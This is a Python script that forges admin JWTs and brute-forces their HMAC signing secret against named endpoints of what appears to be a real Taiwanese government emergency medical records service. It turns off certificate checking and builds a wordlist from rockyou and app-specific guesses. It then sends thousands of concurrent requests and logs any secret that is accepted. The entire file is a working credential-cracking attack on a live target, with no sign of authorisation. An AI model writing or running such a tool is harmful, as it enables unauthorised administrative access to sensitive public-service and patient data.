import ssl, json, hmac, hashlib, base64, threading, time
import urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
TL = threading.local()
def sess():
    if not hasattr(TL,'s'):
        TL.s = []
    return TL.s

def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=')
HDR = b64(b'{"alg":"HS256","typ":"JWT"}')
def sign(sec, pay):
    p=b64(json.dumps(pay,separators=(',',':')).encode())
    s=hmac.new(sec.encode(), HDR+b'.'+p, hashlib.sha256).digest()
    return (HDR+b'.'+p+b'.'+b64(s)).decode()

PAY = {"permissions":["epcr-admin","admin"],"user":{"role":"ADMIN","id":"1"}}
URLS = ["https://epcr.tpf.gov.tw:4004/api/user","https://epcr.tpf.gov.tw:4000/api/user"]

def probe(tok):
    # returns (url, status, body) for the FIRST url that passes signature (non-invalid-sig)
    for u in URLS:
        req=urllib.request.Request(u, headers={"Authorization":"Bearer "+tok})
        try:
            r=urllib.request.urlopen(req, context=ctx, timeout=20)
            return (u, r.status, r.read(150))
        except urllib.error.HTTPError as e:
            body=e.read(150).decode('utf-8','ignore')
            if "invalid signature" not in body and "No authorization" not in body:
                return (u, e.code, body)
            # keep looking at 2nd url
            continue
        except Exception as e:
            return (u, 'ERR', str(e)[:60])
    return (URLS[0], 401, "invalid signature")

def test(sec):
    return sec, probe(sign(sec, PAY))

hits=[]
lock=threading.Lock()
def worker(sec):
    res=test(sec)
    if res[1][1] not in (401, 'ERR'):
        pass
    body=res[1][2]
    if "invalid signature" not in body and "No authorization" not in body:
        with lock: hits.append((sec, res[1][0], res[1][1], body))
    return res

# ---- build candidate wordlist ----
rock=[]
try:
    rock=[l.strip() for l in open("/tmp/rockyou_top1k.txt") if l.strip()]
except: rock=[]
apps = ["epcr","EPCR","EPCRServer","epcrserver","emtracs","EMTRACS","mer","MER","MER2",
        "viewlead","ViewLead","viewlead","vtm","VitalSign","vitalsign","tpf","TPF","gov","govtw",
        "emtapp","1.6.26080","26080","Epcr","epcr123","emtracs123"]
base = ["secret","SECRET","Secret","jwt","JWT","jwtsecret","jwt_secret","signing","signingkey",
        "signkey","token","tokenkey","key","salt","password","passwd","auth","authkey","privatekey",
        "apikey","api_key","secretkey","secret_key","hmac","sha256","md5","pass","admin","root",
        "changeme","letmein","default","dev","debug","prod","production","stage","staging","test",
        "example","demo","qwerty","123456","12345678","123456789","1234567890","password1",
        "password123","admin123","secret123","secret1234","abc123","letmein123","p@ssw0rd",
        "p@ssword","Sunshine","Welcome","welcome1","monkey","dragon","master","iloveyou","baseball",
        "shadow","superman","batman","trustno1","freedom","whatever","qazwsx","1qaz2wsx"]
seps = ["","_","-",".","123","456","789","00","11","99","2020","2021","2022","2023","2024",
        "@123","@1234","!","!!","$","#","1","2","3","999","000","321","654"]
cands=set()
for r in rock: cands.add(r)
for b in base:
    cands.add(b)
    for s in seps: cands.add(b+s); cands.add(s+b)
for a in apps:
    cands.add(a)
    for s in seps: cands.add(a+s); cands.add(s+a)
    cands.add(a+"_"+a); cands.add(a+a); cands.add(a.upper()); cands.add(a.lower())
    for b in base[:60]:
        cands.add(a+b); cands.add(a+"_"+b); cands.add(a+"-"+b); cands.add(b+a)
# rockyou x short app terms (top)
top_app = ["epcr","emtracs","viewlead","mer","vital"]
for r in rock[:300]:
    for a in top_app:
        cands.add(r+a); cands.add(r+"_"+a); cands.add(r+a.upper())
cands={c for c in cands if c and len(c)<=48}
print("total candidates:", len(cands))

import sys
cand_list=list(cands)+[l.strip() for l in open("candidates.txt") if l.strip()]
N=len(cand_list)
counter=[0]
done=threading.Event()
print("starting concurrent brute force, workers=40 ...", flush=True)
def run_batch(chunk):
    with ThreadPoolExecutor(max_workers=120) as ex:
        futs=[ex.submit(worker, s) for s in chunk]
        for f in as_completed(futs):
            try: f.result()
            except: pass
            with lock:
                counter[0]+=1
                if counter[0]%2000==0:
                    print("  tested", counter[0], "/", N, flush=True)

# run in one pool
with ThreadPoolExecutor(max_workers=120) as ex:
    futs=[ex.submit(worker, s) for s in cand_list]
    for i,f in enumerate(as_completed(futs),1):
        try: f.result()
        except: pass
        if i%3000==0:
            print("  tested", i, "/", N, flush=True)

print("DONE. total tested:", len(cand_list), "hits:", len(hits), flush=True)
for h in hits:
    print("HIT -> secret=%r url=%s status=%s body=%r" % h, flush=True)
